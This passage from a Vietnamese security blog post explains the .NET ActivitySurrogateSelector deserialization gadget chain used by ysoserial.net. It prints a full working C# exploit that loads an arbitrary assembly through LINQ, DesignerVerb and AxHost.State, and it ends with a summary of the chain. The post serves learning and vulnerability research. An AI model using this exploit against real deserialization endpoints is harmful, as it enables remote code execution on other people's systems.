<li>Khi <code>enumerator.Name = PropertyBagBinary</code>, câu lệnh tại dòng <code>7228</code> được thực thi</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2062.png"></p>
<ul>
<li>Đến đây thì stream sẽ được deserialize. Đây cũng là endpoint của 1 chain khác <strong><code>AxHostState attack chain</code></strong></li>
</ul>
<p>Nhưng như thế thì liên quan gì đến đoạn code ban đầu của chúng ta? Tại sao không thêm đoạn này thì lại bị lỗi? Điều chúng ta cần đâu phải hàm Deserialize này vì trong đoạn code đã deserialize rồi mà??</p>
<p>Tôi quyết định dùng DNSpy để decode.Chương trình đã vào phần xử lý lỗi khi deserialize Hashtable vì duplicate.</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2063.png"></p>
<p>Cứ tiếp tục và thấy</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2064.png"></p>
<p>oh, Tôi đã hiểu! Các bạn còn nhớ để trigger <code>ToString()</code> ta phải làm cho quá trình deserialize của HashTable bị lỗi, nhảy vào exception để trigger ToString() chứ? Exception này là do nó trả về trước khi malicious của chúng ta execute nên đã nhận thông báo lỗi.</p>
<p>Do đó, <a href="http://ysoserial.net">ysoserial.net</a> sử dụng <strong><strong>System.Windows.Forms.AxHost.State</strong></strong> để xử lý lỗi này, cụ thể khi bị trigger lỗi, hàm này sẽ xử lý. Trong payload, ta set</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2065.png"></p>
<p>khi đó, <code>this.proBag.Read()</code> được gọi với stream là payload của mình</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2066.png"></p>
<ul>
<li>Đến đây thì payload sẽ được deserialize 1 lần nữa</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2067.png"></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2068.png"></p>
<ul>
<li>Khúc này khá ảo. Theo như tôi hiểu, lần đầu deserialize thì sẽ bị lỗi, chúng ta thêm <strong><strong>System.Windows.Forms.AxHost.State</strong></strong> để handle error này</li>
<li>Khi handle error này, payload của chúng ta được deserialize 1 lần nữa. Mà lần deserialize này do đã add handle exception trước đó rồi, nên error sẽ không  bị văng ra và malicious sẽ được execute.</li>
<li>Full exploit:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ComponentModel.Design</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Soap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Web.UI.WebControls</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">LinqBasic</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">MySurrogateSelector</span> <span class="p">:</span> <span class="n">SurrogateSelector</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">override</span> <span class="n">ISerializationSurrogate</span> <span class="n">GetSurrogate</span><span class="p">(</span><span class="n">Type</span> <span class="n">type</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">selector</span> <span class="p">=</span> <span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(!</span><span class="n">type</span><span class="p">.</span><span class="n">IsSerializable</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Type</span> <span class="n">t</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="n">ISerializationSurrogate</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">base</span><span class="p">.</span><span class="n">GetSurrogate</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">selector</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">
</span></span></span><span class="line"><span class="cl"><span class="na">    [Serializable]</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">PayloadClass</span> <span class="p">:</span> <span class="n">ISerializable</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">GadgetChains</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Trace</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;In GetObjectData&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Build a chain to map a byte array to creating an instance of a class.</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// byte[] -&gt; Assembly.Load -&gt; Assembly -&gt; Assembly.GetType -&gt; Type[] -&gt; Activator.CreateInstance -&gt; Win!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step 1</span>
</span></span><span class="line"><span class="cl">            <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">ExploitClass</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Location</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e1</span> <span class="p">=</span> <span class="n">data</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step 2</span>
</span></span><span class="line"><span class="cl">            <span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;</span> <span class="n">map_type</span> <span class="p">=</span> <span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;)</span><span class="n">Delegate</span><span class="p">.</span><span class="n">CreateDelegate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;),</span> <span class="k">typeof</span><span class="p">(</span><span class="n">Assembly</span><span class="p">).</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetTypes&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e2</span> <span class="p">=</span> <span class="n">e1</span><span class="p">.</span><span class="n">SelectMany</span><span class="p">(</span><span class="n">map_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step 3</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e3</span> <span class="p">=</span> <span class="n">e2</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// PagedDataSource maps an arbitrary IEnumerable to an ICollection</span>
</span></span><span class="line"><span class="cl">            <span class="n">PagedDataSource</span> <span class="n">pds</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PagedDataSource</span><span class="p">()</span> <span class="p">{</span> <span class="n">DataSource</span> <span class="p">=</span> <span class="n">e3</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// AggregateDictionary maps an arbitrary ICollection to an IDictionary </span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Class is internal so need to use reflection.</span>
</span></span><span class="line"><span class="cl">            <span class="n">IDictionary</span> <span class="n">dict</span> <span class="p">=</span> <span class="p">(</span><span class="n">IDictionary</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="kt">int</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Runtime.Remoting.Channels.AggregateDictionary&#34;</span><span class="p">),</span> <span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.</span>
</span></span><span class="line"><span class="cl">            <span class="n">DesignerVerb</span> <span class="n">verb</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DesignerVerb</span><span class="p">(</span><span class="s">&#34;XYZ&#34;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Need to insert IDictionary using reflection.</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span><span class="p">(</span><span class="n">MenuCommand</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;properties&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="n">dict</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Pre-load objects, this ensures they&#39;re fixed up before building the hash table.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">List</span><span class="p">&lt;</span><span class="kt">object</span><span class="p">&gt;</span> <span class="n">ls</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">object</span><span class="p">&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">verb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">dict</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Hashtable</span> <span class="n">ht</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Add two entries to table.</span>
</span></span><span class="line"><span class="cl">            <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="s">&#34;Hello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;Dummy&#34;</span><span class="p">,</span> <span class="s">&#34;Hello2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// reflection to change buckets</span>
</span></span><span class="line"><span class="cl">            <span class="n">FieldInfo</span> <span class="n">fi_keys</span> <span class="p">=</span> <span class="n">ht</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;buckets&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Array</span> <span class="n">keys</span> <span class="p">=</span> <span class="p">(</span><span class="n">Array</span><span class="p">)</span><span class="n">fi_keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">FieldInfo</span> <span class="n">fi_key</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetElementType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">keys</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object</span> <span class="n">bucket</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object</span> <span class="n">key</span> <span class="p">=</span> <span class="n">fi_key</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="k">is</span> <span class="kt">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">fi_key</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">verb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">fi_keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="n">keys</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">BinaryFormatter</span> <span class="n">fmt1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MySurrogateSelector</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">ls</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">stm</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Trace</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;In GetObjectData&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">SetType</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">.</span><span class="n">AxHost</span><span class="p">.</span><span class="n">State</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">&#34;PropertyBagBinary&#34;</span><span class="p">,</span> <span class="n">GadgetChains</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Configuration</span><span class="p">.</span><span class="n">ConfigurationManager</span><span class="p">.</span><span class="n">AppSettings</span><span class="p">.</span><span class="n">Set</span><span class="p">(</span><span class="s">&#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&#34;</span><span class="p">,</span> <span class="s">&#34;true&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">fmt1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">fmt2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">PayloadClass</span> <span class="n">test</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PayloadClass</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MySurrogateSelector</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//fmt1.Serialize(stm, test.GadgetChains());</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">test</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">stm</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">SeekOrigin</span><span class="p">.</span><span class="n">Begin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt2</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2069.png"></p>
<h2 id="vi-tổng-kết">VI Tổng kết</h2>
<ul>
<li>Vậy là đi qua chain này rồi, tới đây và tại thời điểm này tôi nghĩ mình đã hiểu được 90-95% chain này.</li>
<li>Đây là một blog dài, nhưng với 1 .Net deserialize 2 tuần như tôi thì qua blog này tôi học được rất nhiều thứ.</li>
<li>Và đây là tổng kết flow của chain <strong><strong>ActivitySurrogateSelector:</strong></strong>
<ol>
<li>
<p>Trigger lỗi trong HashTable để execute vào ToString</p>
</li>
<li>
<p>Từ ToString đến IEnumerable</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">ToString</span> <span class="p">-&gt;</span> <span class="n">DesignerVerb</span>  <span class="p">-&gt;</span> <span class="n">IDictionary</span>  <span class="p">-&gt;</span> <span class="n">AggregateDictionary</span>  <span class="p">-&gt;</span> <span class="n">ICollectionICollection</span> <span class="p">-&gt;</span> <span class="n">PagedDataSource</span>  <span class="p">-&gt;</span> <span class="n">IEnumerable</span>  
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Từ IEnumerable đến LINQ exploit chain</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">byte</span><span class="p">[]</span> <span class="p">-&gt;</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="p">-&gt;</span> <span class="n">Assembly</span>
</span></span><span class="line"><span class="cl"><span class="n">Assembly</span> <span class="p">-&gt;</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Type</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span><span class="p">[]</span> <span class="p">-&gt;</span> <span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">Type</span><span class="p">[])</span> <span class="p">-&gt;</span> <span class="kt">object</span><span class="p">[]</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>LINQ exploit chain:</p>
<ol>
<li>Sử dụng <code>ActivitySurrogateSelector+ObjectSurrogate</code> để serialize những class không thể serialize, mục tiêu tại LINQ</li>
<li>Dùng LINQ thay thế delegate của nó thành <code>Assembly.Load</code> để load malicious code và tạo 1 instance</li>
</ol>
</li>
<li>
